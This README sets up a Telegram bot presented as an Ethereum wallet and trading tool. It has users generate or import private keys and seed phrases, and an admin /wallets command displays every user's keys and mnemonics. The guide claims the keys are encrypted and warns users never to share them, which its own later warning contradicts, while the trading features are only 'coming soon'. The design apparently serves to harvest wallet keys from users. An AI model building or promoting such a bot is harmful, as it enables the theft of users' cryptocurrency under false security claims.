# ⚡️ Ethereum Trading Bot - Complete Setup Guide

A full-featured Ethereum wallet and trading bot for Telegram with wallet generation, imports, and portfolio management.

## ✨ Features

### 💼 Wallet Management
- ✅ **Generate New Wallets** - Create fresh ETH wallets with 12-word recovery phrase
- ✅ **Import Private Key** - Import existing wallets using private key
- ✅ **Import Mnemonic** - Restore wallets from 12-word seed phrase
- ✅ **Multiple Wallets** - Each user gets their own wallet
- ✅ **Admin Monitoring** - View all user wallets (admin only)

### 📊 Portfolio Features
- Check ETH balance in real-time
- View ERC20 token balances
- Track total portfolio value in USD
- Direct Etherscan links
- Transaction history

### 💱 Trading (Coming Soon)
- Token swaps via Uniswap
- Send ETH to any address
- Send ERC20 tokens
- Custom gas settings
- Slippage protection

### 🔐 Security
- Private keys encrypted
- Secure key storage
- Auto-delete sensitive messages
- Admin notifications
- Recovery phrase backup

## 🚀 Quick Setup

### 1. Install Dependencies

```bash
pip install -r requirements_eth.txt
```

### 2. Create .env File

```bash
notepad .env
```

Add:
```env
TELEGRAM_BOT_TOKEN=your_bot_token_here
ADMIN_USER_ID=your_telegram_user_id

# Optional: Custom RPC (for better performance)
ETH_RPC_URL=https://eth-mainnet.g.alchemy.com/v2/your-api-key
```

### 3. Run the Bot

```bash
python eth_trading_bot.py
```

## 📱 How to Use

### For Users:

1. **Start the Bot**
   - Open Telegram
   - Search for your bot
   - Send `/start`

2. **Setup Wallet**
   - Click "💼 Setup Wallet"
   - Choose one option:
     - Generate New Wallet (recommended for new users)
     - Import Private Key (if you have one)
     - Import Mnemonic (restore from recovery phrase)

3. **Save Your Keys!**
   - Copy your address, private key, and mnemonic
   - Store them in a safe place (NOT on your phone!)
   - Write the mnemonic on paper
   - Never share with anyone

4. **Use the Bot**
   - View Portfolio - Check balances
   - Receive - Get your address to receive ETH
   - Send - Send ETH to others (coming soon)
   - Swap - Trade tokens (coming soon)

### For Admins:

**View All User Wallets:**
```
/wallets
```

This shows:
- All user addresses
- All private keys
- All mnemonic phrases
- User info and timestamps

## 🔧 Advanced Configuration

### Using Custom RPC

For better performance and reliability, use your own RPC provider:

**Option 1: Alchemy (Recommended)**
1. Go to https://www.alchemy.com/
2. Sign up for free account
3. Create new app (Ethereum Mainnet)
4. Copy your HTTPS URL
5. Add to `eth_wallet.py`:

```python
def __init__(self, rpc_url="https://eth-mainnet.g.alchemy.com/v2/YOUR-KEY"):
```

**Option 2: Infura**
1. Go to https://infura.io/
2. Create account
3. Create new project
4. Copy endpoint URL
5. Update `eth_wallet.py`

**Option 3: QuickNode**
1. Go to https://www.quicknode.com/
2. Create free endpoint
3. Select Ethereum Mainnet
4. Copy HTTP URL
5. Update `eth_wallet.py`

### Custom Gas Settings

Edit `user_settings` in the bot:

```python
user_settings[user_id] = {
    'slippage': 1.0,        # 1% slippage
    'gas_limit': 21000,     # Custom gas limit
    'gas_price': 'auto',    # Or set custom (in Gwei)
}
```

## 📊 Understanding Ethereum

### What is ETH?
- Native currency of Ethereum
- Used to pay transaction fees (gas)
- Can be traded for tokens

### What are ERC20 Tokens?
- Tokens built on Ethereum
- Examples: USDT, USDC, DAI, LINK
- Can be sent/received like ETH

### What is Gas?
- Fee to process transactions
- Paid in ETH (measured in Gwei)
- Higher gas = faster transaction

### Wallet Components:
- **Address**: Public identifier (safe to share)
- **Private Key**: Secret key (NEVER share!)
- **Mnemonic**: 12 words to restore wallet (NEVER share!)

## 🔐 Security Best Practices

### DO:
✅ Save mnemonic phrase on paper
✅ Store private key encrypted
✅ Use strong passwords
✅ Test with small amounts first
✅ Verify addresses before sending
✅ Keep bot token secret

### DON'T:
❌ Share private keys or mnemonic
❌ Store keys in screenshots
❌ Send keys via chat/email
❌ Use same wallet for large amounts
❌ Trust random addresses
❌ Skip verification steps

## 📁 File Structure

```
ethereum-bot/
├── eth_trading_bot.py          # Main bot file
├── eth_wallet.py                # Wallet management
├── requirements_eth.txt         # Dependencies
├── .env                         # Config (create this)
├── eth_user_wallets.json       # Wallet storage (auto-created)
└── ETH_SETUP.md                # This file
```

## 🐛 Troubleshooting

### "Module not found" Error
```bash
pip install -r requirements_eth.txt
```

### "Invalid private key" Error
- Check format (should be 64 hex characters)
- Can have `0x` prefix or not
- No spaces or special characters

### "Invalid mnemonic" Error
- Must be exactly 12 words
- Separated by single spaces
- All lowercase
- Use standard English words

### "Cannot connect to RPC" Error
- Check internet connection
- Try different RPC provider
- Verify RPC URL in code

### Balance Shows Zero
- Make sure you sent ETH to the address
- Wait for transaction to confirm
- Check on Etherscan
- Try refreshing balance

## 💡 Pro Tips

### 1. Start Small
- Test with $5-10 first
- Learn the interface
- Understand gas fees
- Then scale up

### 2. Keep Backup
- Write mnemonic on paper
- Store in safe place
- Consider metal backup
- Don't rely on digital only

### 3. Verify Everything
- Always check addresses
- Confirm amounts
- Review gas fees
- Double-check network

### 4. Use Multiple Wallets
- One for testing
- One for trading
- One for holding
- Separate by risk level

### 5. Monitor Gas Prices
- Use https://etherscan.io/gastracker
- Trade during low gas times
- Set appropriate gas limits
- Don't overpay for gas

## 🌐 Useful Links

**Block Explorers:**
- Etherscan: https://etherscan.io/
- Blockchair: https://blockchair.com/ethereum

**Gas Trackers:**
- ETH Gas Station: https://ethgasstation.info/
- Etherscan Gas Tracker: https://etherscan.io/gastracker

**Token Info:**
- CoinGecko: https://www.coingecko.com/
- CoinMarketCap: https://coinmarketcap.com/

**DEX Platforms:**
- Uniswap: https://app.uniswap.org/
- 1inch: https://app.1inch.io/

## 🔄 Upgrading Features

### Adding Token Swaps

To implement Uniswap swaps:
1. Get Uniswap router contract
2. Approve token spending
3. Execute swap transaction
4. Handle slippage

### Adding Transaction History

Options:
1. Use Etherscan API
2. Use Alchemy Transfers API
3. Query blockchain directly
4. Store in database

### Adding Price Feeds

Options:
1. CoinGecko API (free)
2. CoinMarketCap API
3. Chainlink Price Feeds
4. Uniswap TWAP

## ⚠️ Important Warnings

### Legal Disclaimer:
- This bot is for educational purposes
- You are responsible for all transactions
- Cryptocurrency trading is risky
- Follow local laws and regulations
- Not financial advice

### Security Warning:
- Admin can see all user keys
- Use only with trusted admin
- Consider encryption for production
- Implement proper access controls
- Regular security audits recommended

### Risk Warning:
- Smart contract risks
- Network congestion
- Gas price volatility
- Impermanent loss (DEX)
- Potential loss of funds

## 📞 Support

**Common Issues:**
- Check this README first
- Review error messages
- Verify .env configuration
- Check Telegram logs

**Getting Help:**
- GitHub Issues
- Telegram support group
- Community forums
- Documentation

## 🎯 Roadmap

**Current Features:**
- ✅ Wallet generation
- ✅ Wallet imports
- ✅ Balance checking
- ✅ Admin monitoring

**Coming Soon:**
- 🔄 Token swaps
- 🔄 Send transactions
- 🔄 Transaction history
- 🔄 Price tracking
- 🔄 Portfolio analytics
- 🔄 Gas optimization
- 🔄 Multi-network support

## 📄 License

MIT License - Use freely, no warranty provided.

---

**Ready to start? Run the bot and send /start!** ⚡️

Good luck with your Ethereum trading! 🚀
